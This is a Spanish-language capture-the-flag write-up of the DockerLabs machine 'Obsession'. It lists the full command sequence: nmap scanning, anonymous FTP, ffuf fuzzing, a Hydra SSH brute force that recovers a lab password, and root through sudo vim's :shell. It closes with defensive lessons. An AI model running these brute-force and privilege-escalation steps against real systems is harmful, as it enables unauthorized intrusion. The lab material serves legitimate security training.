# 🕵️ Máquina: Obsession — DockerLabs

**Plataforma:** DockerLabs · **Dificultad:** Muy fácil · **SO:** Ubuntu Linux · **IP objetivo:** `172.17.0.2`

> Spoiler: el "amor secreto" de esta máquina no es la vulnerabilidad más difícil que verás en tu vida, pero sí una lección perfecta de por qué NO debes reciclar tu usuario en todos lados como si fuera tu playlist de Spotify.

---

## 🧭 Resumen del camino hasta root

```
Ping (vive) → Nmap (FTP + SSH + HTTP)
   → FTP anónimo (dos ficheros jugosos)
   → HTML con un comentario que no debería existir
   → ffuf descubre /backup
   → Hydra revienta el SSH
   → sudo -l revela vim con superpoderes
   → :shell → root 🏆
```

---

## 1️⃣ ¿Está vivo el objetivo?

Lo primero de siempre: comprobar que la máquina responde.

```bash
ping -c 2 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.076 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.055 ms
2 packets transmitted, 2 received, 0% packet loss
```

Un TTL de 64 es básicamente la máquina gritando "SOY LINUX" sin que se lo preguntemos dos veces.

---

## 2️⃣ Nmap: la libreta de reclamaciones del objetivo

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv -oN escaneo.txt 172.17.0.2
```

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 21/tcp | abierto | FTP | vsftpd 3.0.5 |
| 22/tcp | abierto | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | abierto | HTTP | Apache 2.4.58 (Ubuntu) |

Lo interesante: **el FTP acepta login anónimo**. Cuando un servicio te deja entrar sin credenciales, generalmente es una invitación a fisgonear, y aquí no iba a ser diferente.

---

## 3️⃣ FTP anónimo: el diario íntimo que nadie debería subir a un servidor

```bash
ftp 172.17.0.2
# Usuario: anonymous
# Contraseña: (en blanco, tecla Enter y ya)

ftp> ls
ftp> get chat-privado.txt
ftp> get lista-tareas.txt
ftp> quit
```

### `chat-privado.txt`

```
[16:21, 16/6/2024] Gonza: en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa, le he hecho hasta un vídeo...
[16:29, 16/6/2024] Russoski: lo tengo guardado en mi ordenador, en una ruta segura, ya te lo enseño cuando quedemos
```

Un chat filtrado por FTP, con el drama incluido gratis. Sacamos el primer dato de valor: el nombre de usuario **`russoski`**.

### `lista-tareas.txt`

```
1 Comprar el voucher de la certificación eJPTv2 ya mismo
2 Subir el precio de mis asesorías online
3 Terminar mi laboratorio para DockerLabs
4 Revisar la configuración de mi equipo, creo que tengo permisos
  mal puestos que no son nada seguros... (ojo con esto)
```

El propio "russoski" nos deja la pista de que su máquina tiene permisos flojos. Vamos a tomarle la palabra.

---

## 4️⃣ El sitio web: cuando los comentarios HTML hablan de más

```bash
curl -i http://172.17.0.2
```

Escondido en el código fuente:

```html
<!-- Uso el mismo usuario en todos mis servicios, así no se me olvida -->
```

Traducción libre: "he puesto la misma llave en todas mis puertas". Con esto confirmamos que **`russoski`** probablemente también es su usuario de SSH.

### Fuzzing de directorios con ffuf

```bash
ffuf -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt \
     -u http://172.17.0.2/FUZZ -r -ac -v -recursion
```

```
[200] /backup
[200] /important
```

**`/important`** resultó ser un archivo con el Manifiesto Hacker clásico (bonito gesto, cero utilidad práctica).

**`/backup`** en cambio es oro puro:

```bash
wget http://172.17.0.2/backup/backup.txt
cat backup.txt
```

```
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

Usuario confirmado, en texto plano, cortesía de una carpeta de backup que nunca debió estar accesible desde fuera.

---

## 5️⃣ Fuerza bruta al SSH con Hydra

Con el usuario en mano, tocaba adivinar la contraseña. Rockyou al rescate, como siempre.

```bash
hydra -l russoski -P ~/Desktop/Wordlists/rockyou.txt -V ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

`iloveme`. Poético, considerando el contexto del chat sobre Nágore. Casi tierno si no fuera una vulnerabilidad.

### Conexión

```bash
ssh russoski@172.17.0.2
# Contraseña: iloveme
```

```
Welcome to Ubuntu 24.04 LTS (GNU/Linux 7.0.12-zen1-1-zen x86_64)
russoski@c9b63865b888:~$
```

Estamos dentro. Ahora toca subir de nivel.

---

## 6️⃣ De russoski a root: gracias, sudo

```bash
sudo -l
```

```
User russoski may run the following commands on c9b63865b888:
    (root) NOPASSWD: /usr/bin/vim
```

Aquí está el "permiso mal puesto" que el propio usuario nos advirtió en su lista de tareas. `vim` con `NOPASSWD` como root es, en la práctica, una llave maestra: cualquier editor con capacidad de abrir una shell interna hereda los privilegios del proceso que lo ejecuta.

Consulta rápida en [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/) para confirmar la técnica exacta.

### La jugada

```bash
sudo vim
```

Una vez dentro, en modo normal (fuera de modo inserción):

```
:shell
```

```
root@c9b63865b888:/home/russoski# id
uid=0(root) gid=0(root) groups=0(root)

root@c9b63865b888:/home/russoski# whoami
root
```

🏆 **Root conseguido.** De un editor de texto a control total del sistema en una sola línea de comandos.

---

## 🎬 Bonus: el vídeo que tanto escondió Russoski

El chat mencionaba una "ruta segura" donde guardaba cierto vídeo. Con acceso root, no hacía falta buscar mucho:

```bash
ls /root
# Video-Nagore-Fernandez.txt

cat /root/Video-Nagore-Fernandez.txt
```

```
Al fin lo terminé! es tan hermosa.. <3
https://www.youtube.com/shorts/_v8GzGReTAk
```

Resulta que la "ruta segura" era simplemente `/root`. La seguridad por oscuridad, una vez más, demostrando que no es seguridad.

---

## 📋 Resumen de credenciales

| Usuario | Contraseña | Cómo se obtuvo |
|---------|------------|-----------------|
| `russoski` | `iloveme` | Fuerza bruta con Hydra + rockyou.txt |
| `root` | — | `sudo vim` → `:shell` |

---

## 🧠 Lecciones que deja esta máquina

- **FTP anónimo activo** = puerta abierta a archivos internos, notas personales y nombres de usuario servidos en bandeja.
- **Comentarios en el HTML** no son un lugar para "notitas rápidas": todo el mundo con `Ctrl+U` puede leerlos.
- **Reutilizar el mismo usuario en todos los servicios** convierte un solo fallo en un compromiso total. Es el equivalente digital de usar la misma llave para casa, coche y taquilla del gimnasio.
- **Carpetas de backup expuestas públicamente** (`/backup`) son un clásico: si algo dice "backup", probablemente no debería estar a un `wget` de distancia.
- **`sudo NOPASSWD` sobre binarios como `vim`** equivale, en la práctica, a dar acceso root sin contraseña. Revisa siempre [GTFOBins](https://gtfobins.github.io/) antes de otorgar permisos sudo a cualquier binario, por inofensivo que parezca.

---

## 🔗 Referencias

- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
- [DockerLabs](https://dockerlabs.es/)
